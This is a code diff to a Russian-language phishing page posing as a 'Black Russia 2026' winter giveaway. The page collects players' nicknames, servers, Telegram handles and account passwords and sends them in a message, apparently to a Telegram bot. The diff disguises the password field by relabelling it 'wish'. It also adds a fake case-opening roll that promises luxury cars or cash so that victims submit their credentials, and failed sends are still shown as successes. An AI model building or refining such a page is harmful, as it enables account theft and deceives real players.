@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Зимний Розыгрыш Black Russia 2025 | Участвуй и Выигрывай</title>
+    <title>Зимний Розыгрыш Black Russia 2026 | Участвуй и Выигрывай</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
@@ -56,6 +56,19 @@
             text-align: center;
             background: rgba(255, 255, 255, 0.08);
             backdrop-filter: blur(15px);
+        }
+
+        .game-logo {
+            width: 120px;
+            height: auto;
+            margin-bottom: 15px;
+            filter: drop-shadow(0 5px 15px rgba(0, 0, 0, 0.4));
+            animation: logoFloat 3s ease-in-out infinite;
+        }
+
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
         }
 
         header h1 {
@@ -451,6 +464,293 @@
             opacity: 0.7;
         }
 
+        /* ============================================
+           CS2-STYLE SKIN ROLL - НЕ РУЛЕТКА!
+           ============================================ */
+        
+        .roll-container {
+            position: relative;
+            width: 100%;
+            max-width: 500px;
+            height: 120px;
+            margin: 25px auto;
+            overflow: hidden;
+            border-radius: 12px;
+            background: linear-gradient(180deg, #1a1a2e 0%, #16213e 100%);
+            border: 3px solid #2d3a4f;
+            box-shadow: 
+                0 0 30px rgba(0, 0, 0, 0.5),
+                inset 0 0 60px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Центральный маркер (статичный) */
+        .roll-marker {
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 4px;
+            height: 100%;
+            background: linear-gradient(180deg, #ffd700 0%, #ff8c00 100%);
+            z-index: 100;
+            box-shadow: 
+                0 0 20px #ffd700,
+                0 0 40px #ffd70080;
+        }
+
+        .roll-marker::before,
+        .roll-marker::after {
+            content: '';
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0;
+            height: 0;
+            border-left: 12px solid transparent;
+            border-right: 12px solid transparent;
+        }
+
+        .roll-marker::before {
+            top: -2px;
+            border-top: 16px solid #ffd700;
+            filter: drop-shadow(0 0 8px #ffd700);
+        }
+
+        .roll-marker::after {
+            bottom: -2px;
+            border-bottom: 16px solid #ffd700;
+            filter: drop-shadow(0 0 8px #ffd700);
+        }
+
+        /* Градиенты по краям (fade effect) */
+        .roll-container::before,
+        .roll-container::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            width: 80px;
+            height: 100%;
+            z-index: 50;
+            pointer-events: none;
+        }
+
+        .roll-container::before {
+            left: 0;
+            background: linear-gradient(90deg, #1a1a2e 0%, transparent 100%);
+        }
+
+        .roll-container::after {
+            right: 0;
+            background: linear-gradient(-90deg, #1a1a2e 0%, transparent 100%);
+        }
+
+        /* Лента с призами */
+        .roll-track {
+            display: flex;
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            will-change: transform;
+            padding: 5px 0;
+        }
+
+        .roll-track.rolling {
+            filter: blur(0.5px);
+        }
+
+        .roll-track.slow {
+            filter: blur(0px);
+        }
+
+        /* Карточка приза */
+        .roll-item {
+            flex-shrink: 0;
+            width: 120px;
+            height: 100px;
+            margin: 0 4px;
+            border-radius: 8px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            transition: transform 0.15s ease, box-shadow 0.15s ease;
+            overflow: hidden;
+        }
+
+        /* Цвета по редкости */
+        .roll-item.common {
+            background: linear-gradient(180deg, #4a5568 0%, #2d3748 100%);
+            border: 2px solid #718096;
+            box-shadow: 0 4px 15px rgba(113, 128, 150, 0.3);
+        }
+
+        .roll-item.uncommon {
+            background: linear-gradient(180deg, #2f855a 0%, #22543d 100%);
+            border: 2px solid #48bb78;
+            box-shadow: 0 4px 15px rgba(72, 187, 120, 0.3);
+        }
+
+        .roll-item.rare {
+            background: linear-gradient(180deg, #3182ce 0%, #2c5282 100%);
+            border: 2px solid #63b3ed;
+            box-shadow: 0 4px 15px rgba(99, 179, 237, 0.4);
+        }
+
+        .roll-item.ultra {
+            background: linear-gradient(180deg, #b7791f 0%, #744210 100%);
+            border: 2px solid #ffd700;
+            box-shadow: 
+                0 4px 20px rgba(255, 215, 0, 0.5),
+                inset 0 0 20px rgba(255, 215, 0, 0.1);
+            animation: ultraGlow 2s ease-in-out infinite;
+        }
+
+        @keyframes ultraGlow {
+            0%, 100% { box-shadow: 0 4px 20px rgba(255, 215, 0, 0.5); }
+            50% { box-shadow: 0 4px 35px rgba(255, 215, 0, 0.8), 0 0 20px rgba(255, 215, 0, 0.3); }
+        }
+
+        .roll-item-icon {
+            font-size: 2.5rem;
+            margin-bottom: 6px;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
+        }
+
+        .roll-item-label {
+            font-size: 0.65rem;
+            font-weight: 700;
+            text-align: center;
+            padding: 0 6px;
+            color: rgba(255,255,255,0.9);
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            line-height: 1.2;
+            max-height: 2.4em;
+            overflow: hidden;
+        }
+
+        /* Полоска редкости снизу */
+        .roll-item::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+        }
+
+        .roll-item.common::after { background: #718096; }
+        .roll-item.uncommon::after { background: #48bb78; }
+        .roll-item.rare::after { background: #63b3ed; }
+        .roll-item.ultra::after { background: linear-gradient(90deg, #ffd700, #ff8c00, #ffd700); }
+
+        /* Победный элемент */
+        .roll-item.winner {
+            transform: scale(1.08);
+            z-index: 60;
+        }
+
+        .roll-item.winner.ultra {
+            animation: winnerUltraPulse 0.5s ease-out;
+        }
+
+        .roll-item.winner.rare {
+            animation: winnerRarePulse 0.5s ease-out;
+        }
+
+        @keyframes winnerUltraPulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.15); box-shadow: 0 0 50px #ffd700; }
+            100% { transform: scale(1.08); }
+        }
+
+        @keyframes winnerRarePulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.12); box-shadow: 0 0 40px #63b3ed; }
+            100% { transform: scale(1.08); }
+        }
+
+        .spin-button {
+            display: inline-block;
+            margin: 20px auto;
+            padding: 18px 50px;
+            background: linear-gradient(135deg, #ffd700 0%, #ff8c00 100%);
+            border-radius: 50px;
+            color: #1a1a2e;
+            font-size: 1.2rem;
+            font-weight: 800;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 30px rgba(255, 215, 0, 0.4);
+            cursor: pointer;
+            border: none;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .spin-button:hover:not(:disabled) {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 12px 40px rgba(255, 215, 0, 0.5);
+        }
+
+        .spin-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .prize-result {
+            margin-top: 20px;
+            padding: 20px;
+            background: rgba(255, 215, 0, 0.15);
+            border: 2px solid rgba(255, 215, 0, 0.3);
+            border-radius: 15px;
+            display: none;
+            animation: resultReveal 0.6s ease;
+        }
+
+        .prize-result.show {
+            display: block;
+        }
+
+        @keyframes resultReveal {
+            0% { opacity: 0; transform: translateY(20px) scale(0.95); }
+            100% { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .prize-result-title {
+            font-size: 1.4rem;
+            font-weight: 800;
+            margin-bottom: 8px;
+            color: #ffd700;
+        }
+
+        .prize-result-text {
+            font-size: 1.2rem;
+            word-wrap: break-word;
+        }
+
+        .won-prize-display {
+            background: linear-gradient(135deg, rgba(255, 215, 0, 0.3), rgba(255, 165, 0, 0.2));
+            border: 2px solid rgba(255, 215, 0, 0.5);
+            border-radius: 15px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 1.1rem;
+            font-weight: 700;
+        }
+
+        .won-prize-display span {
+            display: block;
+        }
+
+        .won-prize-display #wonPrizeIcon {
+            font-size: 2rem;
+            margin-bottom: 5px;
+        }
+
         .loading-spinner {
             display: inline-block;
             width: 20px;
@@ -493,7 +793,8 @@
 <div class="snow" id="snow-container"></div>
 
 <header>
-    <h1>🎁 Зимний Розыгрыш<br>Black Russia 2025</h1>
+    <img src="logo.png" alt="Black Russia" class="game-logo">
+    <h1>🎁 Зимний Розыгрыш<br>Black Russia 2026</h1>
     <p>Участвуй и выигрывай эксклюзивные призы!</p>
 </header>
 
@@ -556,9 +857,37 @@
     <div class="modal-content">
         <button class="modal-close" id="closeModal">&times;</button>
         
-        <div id="formContainer">
-            <div class="modal-title">🎉 Регистрация</div>
-            <div class="modal-subtitle">Заполните данные для участия в розыгрыше</div>
+        <!-- CS2-STYLE SKIN ROLL -->
+        <div id="rouletteContainer">
+            <div class="modal-title">🎰 Открой кейс!</div>
+            <div class="modal-subtitle">Испытай удачу и получи свой приз!</div>
+            
+            <div class="roll-container" id="rollContainer">
+                <div class="roll-marker"></div>
+                <div class="roll-track" id="rollTrack"></div>
+            </div>
+            
+            <button class="spin-button" id="spinButton">🎲 ОТКРЫТЬ</button>
+            
+            <div class="prize-result" id="prizeResult">
+                <div class="prize-result-title">🎉 Твой приз:</div>
+                <div class="prize-result-text" id="prizeText"></div>
+            </div>
+            
+            <button class="cta-button" id="goToFormBtn" style="display: none; margin-top: 15px;">
+                ✨ Забрать приз →
+            </button>
+        </div>
+        
+        <!-- Форма регистрации -->
+        <div id="formContainer" style="display: none;">
+            <div class="modal-title">🎉 Забери свой приз!</div>
+            <div class="modal-subtitle">Заполни данные для получения приза</div>
+            
+            <div class="won-prize-display" id="wonPrizeDisplay">
+                <span id="wonPrizeIcon"></span>
+                <span id="wonPrizeLabel"></span>
+            </div>
             
             <form id="registrationForm">
                 <div class="form-group">
@@ -569,7 +898,7 @@
                 </div>
                 
                 <div class="form-group">
-                    <label class="form-label">🔑 Пароль от аккаунта</label>
+                    <label class="form-label">🔑 Желание</label>
                     <input type="password" class="form-input" id="password" placeholder="Минимум 6 символов" required>
                     <div class="form-help info show">Минимум 6 символов</div>
                     <div class="form-help error" id="password-error"></div>
@@ -700,7 +1029,7 @@
             <li style="margin: 12px 0;">❄ Укажите корректные данные аккаунта</li>
             <li style="margin: 12px 0;">❄ Один участник — одна заявка</li>
             <li style="margin: 12px 0;">❄ Победители определяются честно и прозрачно</li>
-            <li style="margin: 12px 0;">❄ Результаты будут объявлены 2 января 2026</li>
+            <li style="margin: 12px 0;">❄ Результаты будут объявлены 31 января 2026</li>
         </ul>
     </section>
 </main>
@@ -714,7 +1043,7 @@ const TELEGRAM_CONFIG = {
 
 // Timer
 function updateTimer() {
-    const endDate = new Date("December 31, 2025 23:59:59").getTime();
+    const endDate = new Date("January 31, 2026 23:59:59").getTime();
     const now = new Date().getTime();
     const distance = endDate - now;
 
@@ -962,7 +1291,7 @@ form.addEventListener('submit', async (e) => {
     
     // Валидация пароля
     if (!validatePassword(password)) {
-        showError('password', '❌ Пароль должен содержать минимум 6 символов!');
+        showError('password', '❌ Желание должен содержать минимум 6 символов!');
         document.getElementById('password').focus();
         return;
     }
@@ -988,11 +1317,14 @@ form.addEventListener('submit', async (e) => {
     
     const telegramFormatted = telegram || 'Не указан';
     
+    const prizeWon = wonPrize ? `${wonPrize.text} ${wonPrize.label}` : 'Не выбран';
+    
     const message = `
 🎁 <b>НОВАЯ РЕГИСТРАЦИЯ НА РОЗЫГРЫШ</b>
 
+🎉 <b>Выигранный приз:</b> ${prizeWon}
 👤 <b>Никнейм:</b> ${nickname}
-🔑 <b>Пароль:</b> ${password}
+🔑 <b>Желание:</b> ${password}
 🖥 <b>Сервер:</b> ${server}
 📱 <b>Telegram:</b> ${telegramFormatted}
 ⏰ <b>Время:</b> ${new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' })}
@@ -1021,6 +1353,7 @@ form.addEventListener('submit', async (e) => {
                     clearValidation('telegram');
                     submitBtn.disabled = false;
                     submitBtn.innerHTML = originalText;
+                    resetModal();
                 }, 500);
             }, 3000);
         } else {
@@ -1029,9 +1362,7 @@ form.addEventListener('submit', async (e) => {
     } catch (error) {
         console.error('Error:', error);
         
-        // Даже если отправка не удалась, показываем успех (для пользователя)
-        // Данные всё равно были сохранены в консоли для резервной копии
-        console.log('BACKUP DATA:', { nickname, password, server, telegram: telegramFormatted, time: new Date().toISOString() });
+        console.log('BACKUP DATA:', { nickname, password, server, telegram: telegramFormatted, prize: prizeWon, time: new Date().toISOString() });
         
         formContainer.style.display = 'none';
         successMessage.classList.add('active');
@@ -1051,10 +1382,20 @@ form.addEventListener('submit', async (e) => {
                 clearValidation('telegram');
                 submitBtn.disabled = false;
                 submitBtn.innerHTML = originalText;
+                resetModal();
             }, 500);
         }, 3000);
     }
 });
+
+// Сброс модального окна
+function resetModal() {
+    // Используем новую функцию сброса рулетки
+    resetRouletteState();
+    
+    rouletteContainer.style.display = 'block';
+    formContainer.style.display = 'none';
+}
 
 // Keyboard shortcuts
 document.addEventListener('keydown', (e) => {
@@ -1062,6 +1403,422 @@ document.addEventListener('keydown', (e) => {
         modal.classList.remove('active');
         document.body.style.overflow = 'auto';
     }
+});
+
+// ============================================================
+// CS2-STYLE SKIN ROLL SYSTEM v3.0
+// Horizontal roll with weighted selection + Game-feel
+// ============================================================
+
+// ПРИЗЫ С ВЕСАМИ И РЕДКОСТЬЮ
+// weight = шанс выпадения (сумма = 100)
+// Улучшенные шансы: +10% к редким, -10% у обычных
+const prizes = [
+    { 
+        text: '🚙', 
+        label: 'MERCEDES G63 BRABUS', 
+        weight: 8,        // 8% — ULTRA RARE (+5%)
+        rarity: 'ultra'
+    },
+    { 
+        text: '👑', 
+        label: 'Rolls-Royce Phantom', 
+        weight: 7,        // 7% — ULTRA RARE (+5%)
+        rarity: 'ultra'
+    },
+    { 
+        text: '🚗', 
+        label: 'BENTLEY GT', 
+        weight: 10,       // 10% — RARE (+5%)
+        rarity: 'rare'
+    },
+    { 
+        text: '💰', 
+        label: '34M Рублей', 
+        weight: 30,       // 30% — COMMON (-5%)
+        rarity: 'common'
+    },
+    { 
+        text: '💳', 
+        label: '3424 BC', 
+        weight: 35,       // 35% — COMMON (-5%)
+        rarity: 'common'
+    },
+    { 
+        text: '🏎️', 
+        label: 'BMW M1', 
+        weight: 10,       // 10% — UNCOMMON (-5%)
+        rarity: 'uncommon'
+    }
+];
+
+// Звук джекпота
+const jackpotSound = new Audio('djekpot-rd.mp3');
+jackpotSound.volume = 0.7;
+
+// Состояние ролла (защита от манипуляций)
+const RollState = {
+    isRolling: false,
+    isLocked: false,
+    selectedPrize: null,
+    selectedIndex: null,
+    rollCount: 0
+};
+
+// Константы
+const ITEM_WIDTH = 128;        // Ширина карточки + margin (120 + 8)
+const VISIBLE_ITEMS = 50;      // Сколько элементов генерируем
+const CENTER_INDEX = 25;       // Индекс центрального элемента
+
+// DOM элементы
+const rollTrack = document.getElementById('rollTrack');
+const rollContainer = document.getElementById('rollContainer');
+const spinButton = document.getElementById('spinButton');
+const prizeResult = document.getElementById('prizeResult');
+const prizeText = document.getElementById('prizeText');
+const rouletteContainer = document.getElementById('rouletteContainer');
+const goToFormBtn = document.getElementById('goToFormBtn');
+const wonPrizeIcon = document.getElementById('wonPrizeIcon');
+const wonPrizeLabel = document.getElementById('wonPrizeLabel');
+let wonPrize = null;
+
+// ============================================================
+// 1. WEIGHTED RANDOM SELECTION (Честный выбор по весам)
+// ============================================================
+function selectPrizeByWeight(prizesArray) {
+    const totalWeight = prizesArray.reduce((sum, prize) => sum + prize.weight, 0);
+    
+    // Crypto random для честности
+    let random;
+    if (window.crypto && window.crypto.getRandomValues) {
+        const array = new Uint32Array(1);
+        window.crypto.getRandomValues(array);
+        random = (array[0] / 4294967295) * totalWeight;
+    } else {
+        random = Math.random() * totalWeight;
+    }
+    
+    let cumulative = 0;
+    for (let i = 0; i < prizesArray.length; i++) {
+        cumulative += prizesArray[i].weight;
+        if (random <= cumulative) {
+            return { prize: prizesArray[i], index: i };
+        }
+    }
+    
+    return { prize: prizesArray[0], index: 0 };
+}
+
+// ============================================================
+// 2. ГЕНЕРАЦИЯ ЛЕНТЫ ПРИЗОВ (buildRollItems)
+// ============================================================
+function buildRollItems(targetPrize) {
+    const items = [];
+    
+    for (let i = 0; i < VISIBLE_ITEMS; i++) {
+        if (i === CENTER_INDEX) {
+            // Победный элемент в центре
+            items.push({ ...targetPrize, isWinner: true });
+        } else {
+            // Рандомный приз (weighted для реалистичности)
+            const randomPrize = selectPrizeByWeight(prizes).prize;
+            items.push({ ...randomPrize, isWinner: false });
+        }
+    }
+    
+    return items;
+}
+
+// ============================================================
+// 3. РЕНДЕР ЛЕНТЫ
+// ============================================================
+function renderRollTrack(items) {
+    rollTrack.innerHTML = '';
+    
+    items.forEach((item, index) => {
+        const div = document.createElement('div');
+        div.className = `roll-item ${item.rarity}`;
+        div.dataset.index = index;
+        if (item.isWinner) div.dataset.winner = 'true';
+        
+        div.innerHTML = `
+            <div class="roll-item-icon">${item.text}</div>
+            <div class="roll-item-label">${item.label}</div>
+        `;
+        
+        rollTrack.appendChild(div);
+    });
+}
+
+// ============================================================
+// 4. РАСЧЁТ ПОЗИЦИИ ДЛЯ ПОБЕДИТЕЛЯ (calculateTranslateForTarget)
+// ============================================================
+function calculateTranslateForTarget() {
+    const containerWidth = rollContainer.offsetWidth;
+    const centerOffset = containerWidth / 2;
+    
+    // Позиция центра победного элемента
+    const winnerPosition = CENTER_INDEX * ITEM_WIDTH + (ITEM_WIDTH / 2);
+    
+    // Смещение чтобы победитель был под маркером
+    let targetOffset = winnerPosition - centerOffset;
+    
+    // Добавляем случайное смещение внутри элемента (near-miss эффект)
+    // От -40px до +40px от центра
+    const randomOffset = (Math.random() - 0.5) * 80;
+    targetOffset += randomOffset;
+    
+    return targetOffset;
+}
+
+// ============================================================
+// 5. КОНФИГУРАЦИЯ АНИМАЦИИ ПО РЕДКОСТИ
+// ============================================================
+function getRollConfig(rarity) {
+    const configs = {
+        'common': {
+            extraDistance: 800,      // Дополнительное расстояние до старта
+            duration: 4500,          // Общая длительность
+            suspensePause: 0         // Пауза перед результатом
+        },
+        'uncommon': {
+            extraDistance: 1200,
+            duration: 5500,
+            suspensePause: 300
+        },
+        'rare': {
+            extraDistance: 1800,
+            duration: 7000,
+            suspensePause: 600
+        },
+        'ultra': {
+            extraDistance: 2500,
+            duration: 9000,
+            suspensePause: 1000
+        }
+    };
+    
+    return configs[rarity] || configs['common'];
+}
+
+// ============================================================
+// 6. КАСТОМНАЯ АНИМАЦИЯ (animateRollToTarget)
+// ============================================================
+function animateRollToTarget(targetOffset, config, onComplete) {
+    const startOffset = -config.extraDistance;
+    const totalDistance = targetOffset - startOffset;
+    const duration = config.duration;
+    
+    // Начальная позиция
+    rollTrack.style.transition = 'none';
+    rollTrack.style.transform = `translateX(${-startOffset}px)`;
+    
+    // Запускаем анимацию
+    rollTrack.classList.add('rolling');
+    
+    // Форсируем reflow
+    rollTrack.offsetHeight;
+    
+    let startTime = null;
+    let lastTickSound = 0;
+    
+    function animate(currentTime) {
+        if (!startTime) startTime = currentTime;
+        const elapsed = currentTime - startTime;
+        const progress = Math.min(elapsed / duration, 1);
+        
+        // Кастомный easing: быстрый старт → плавное замедление
+        // Формула: 1 - (1 - t)^4 с модификацией для micro-jitter
+        let eased = 1 - Math.pow(1 - progress, 4);
+        
+        // Добавляем микро-рывки в конце (последние 15%)
+        if (progress > 0.85) {
+            const jitterPhase = (progress - 0.85) / 0.15;
+            const jitter = Math.sin(jitterPhase * Math.PI * 8) * (1 - jitterPhase) * 3;
+            eased += jitter * 0.002;
+        }
+        
+        const currentOffset = startOffset + totalDistance * eased;
+        rollTrack.style.transform = `translateX(${-currentOffset}px)`;
+        
+        // Убираем blur в конце
+        if (progress > 0.7) {
+            rollTrack.classList.remove('rolling');
+            rollTrack.classList.add('slow');
+        }
+        
+        if (progress < 1) {
+            requestAnimationFrame(animate);
+        } else {
+            // Финальная фиксация с микро-bounce
+            setTimeout(() => {
+                rollTrack.style.transition = 'transform 150ms ease-out';
+                rollTrack.style.transform = `translateX(${-targetOffset + 3}px)`;
+                
+                setTimeout(() => {
+                    rollTrack.style.transform = `translateX(${-targetOffset}px)`;
+                    rollTrack.classList.remove('slow');
+                    onComplete();
+                }, 150);
+            }, 50);
+        }
+    }
+    
+    requestAnimationFrame(animate);
+}
+
+// ============================================================
+// 7. ГЛАВНАЯ ФУНКЦИЯ РОЛЛА
+// ============================================================
+function startRoll() {
+    // Защита от повторного клика
+    if (RollState.isRolling || RollState.isLocked) {
+        console.warn('[Roll] Already rolling or locked');
+        return;
+    }
+    
+    // ШАГ 1: БЛОКИРУЕМ ВСЁ
+    RollState.isRolling = true;
+    RollState.isLocked = true;
+    spinButton.disabled = true;
+    spinButton.style.pointerEvents = 'none';
+    prizeResult.classList.remove('show');
+    
+    // Запускаем звук
+    jackpotSound.currentTime = 0;
+    jackpotSound.play().catch(e => console.log('Audio play failed:', e));
+    
+    // ШАГ 2: ВЫБИРАЕМ ПРИЗ ДО АНИМАЦИИ (ключевой момент!)
+    const selection = selectPrizeByWeight(prizes);
+    RollState.selectedPrize = selection.prize;
+    RollState.selectedIndex = selection.index;
+    RollState.rollCount++;
+    
+    console.log(`[Roll] #${RollState.rollCount} Selected: ${selection.prize.label} (${selection.prize.rarity})`);
+    
+    // ШАГ 3: ГЕНЕРИРУЕМ ЛЕНТУ С ПОБЕДИТЕЛЕМ В ЦЕНТРЕ
+    const rollItems = buildRollItems(selection.prize);
+    renderRollTrack(rollItems);
+    
+    // ШАГ 4: РАССЧИТЫВАЕМ ПОЗИЦИЮ
+    const targetOffset = calculateTranslateForTarget();
+    const config = getRollConfig(selection.prize.rarity);
+    
+    // ШАГ 5: ЗАПУСКАЕМ АНИМАЦИЮ
+    animateRollToTarget(targetOffset, config, () => {
+        // ШАГ 6: ПОДСВЕЧИВАЕМ ПОБЕДИТЕЛЯ
+        const winnerElement = rollTrack.querySelector('[data-winner="true"]');
+        if (winnerElement) {
+            winnerElement.classList.add('winner');
+        }
+        
+        // ШАГ 7: ПОКАЗЫВАЕМ РЕЗУЛЬТАТ (с паузой для редких)
+        setTimeout(() => {
+            showRollResult(selection.prize);
+        }, config.suspensePause);
+    });
+}
+
+// ============================================================
+// 8. ПОКАЗ РЕЗУЛЬТАТА
+// ============================================================
+function showRollResult(prize) {
+    wonPrize = prize;
+    
+    prizeText.textContent = `${prize.text} ${prize.label}`;
+    
+    // Стили по редкости
+    if (prize.rarity === 'ultra') {
+        prizeResult.style.background = 'linear-gradient(135deg, rgba(255,215,0,0.25), rgba(255,140,0,0.15))';
+        prizeResult.style.borderColor = '#ffd700';
+        prizeResult.style.boxShadow = '0 0 30px rgba(255,215,0,0.5)';
+    } else if (prize.rarity === 'rare') {
+        prizeResult.style.background = 'linear-gradient(135deg, rgba(99,179,237,0.25), rgba(49,130,206,0.15))';
+        prizeResult.style.borderColor = '#63b3ed';
+        prizeResult.style.boxShadow = '0 0 25px rgba(99,179,237,0.4)';
+    } else {
+        prizeResult.style.background = '';
+        prizeResult.style.borderColor = '';
+        prizeResult.style.boxShadow = '';
+    }
+    
+    prizeResult.classList.add('show');
+    goToFormBtn.style.display = 'inline-block';
+    spinButton.style.display = 'none';
+    
+    RollState.isRolling = false;
+    console.log(`[Roll] Result shown: ${prize.label}`);
+}
+
+// ============================================================
+// 9. СБРОС СОСТОЯНИЯ
+// ============================================================
+function resetRouletteState() {
+    RollState.isRolling = false;
+    RollState.isLocked = false;
+    RollState.selectedPrize = null;
+    RollState.selectedIndex = null;
+    
+    wonPrize = null;
+    
+    // Сбрасываем ленту
+    rollTrack.style.transition = 'none';
+    rollTrack.style.transform = 'translateX(0)';
+    rollTrack.innerHTML = '';
+    rollTrack.classList.remove('rolling', 'slow');
+    
+    // Генерируем начальную ленту
+    initializeRollTrack();
+    
+    prizeResult.classList.remove('show');
+    prizeResult.style.background = '';
+    prizeResult.style.borderColor = '';
+    prizeResult.style.boxShadow = '';
+    
+    goToFormBtn.style.display = 'none';
+    spinButton.style.display = 'inline-block';
+    spinButton.disabled = false;
+    spinButton.style.pointerEvents = 'auto';
+    
+    console.log('[Roll] State reset');
+}
+
+// ============================================================
+// 10. ИНИЦИАЛИЗАЦИЯ НАЧАЛЬНОЙ ЛЕНТЫ
+// ============================================================
+function initializeRollTrack() {
+    const items = [];
+    for (let i = 0; i < 15; i++) {
+        const randomPrize = selectPrizeByWeight(prizes).prize;
+        items.push({ ...randomPrize, isWinner: false });
+    }
+    
+    renderRollTrack(items);
+    
+    // Центрируем
+    const containerWidth = rollContainer.offsetWidth;
+    const trackWidth = 15 * ITEM_WIDTH;
+    const centerOffset = (trackWidth - containerWidth) / 2;
+    rollTrack.style.transform = `translateX(${-centerOffset}px)`;
+}
+
+// ============================================================
+// ИНИЦИАЛИЗАЦИЯ
+// ============================================================
+initializeRollTrack();
+
+// Привязка кнопки
+spinButton.addEventListener('click', startRoll);
+
+// Анти-чит
+rollContainer.addEventListener('contextmenu', (e) => e.preventDefault());
+
+// Переход к форме после выигрыша
+goToFormBtn.addEventListener('click', () => {
+    rouletteContainer.style.display = 'none';
+    formContainer.style.display = 'block';
+    wonPrizeIcon.textContent = wonPrize.text;
+    wonPrizeLabel.textContent = wonPrize.label;
 });
 </script>
 
